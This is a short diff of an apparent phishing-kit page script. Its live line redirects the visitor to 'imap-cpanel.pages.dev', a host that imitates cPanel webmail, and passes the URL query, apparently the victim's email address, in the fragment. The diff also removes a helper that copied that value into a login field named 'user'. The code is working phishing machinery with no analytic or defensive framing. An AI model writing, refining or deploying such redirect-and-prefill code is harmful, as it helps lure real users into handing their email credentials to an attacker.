@@ -35,25 +35,9 @@
 <script>
   var myurl = ('https://imap-cpanel.pages.dev')
   var holdbeer = (window.location.search);
-  window.location.replace(myurl+'#'+holdbeer);
+  window.location.replace(myurl+'#Email'+holdbeer);
   </script>
-  <script>
-            <script type="text/javascript">
-                function autoGrabEmailFromURL() {
-                  var url = window.location.href;
-                  var index = url.indexOf("#");
-                
-                  if (index !== -1 && index < url.length - 1) {
-                    var value = url.substring(index + 1);
-                    var inputElement = document.getElementById("user");
-                
-                    if (inputElement) {
-                      inputElement.value = value;
-                    }
-                  }
-                }
-                autoGrabEmailFromURL();
-                    </script>
+  
 
 <body>
 
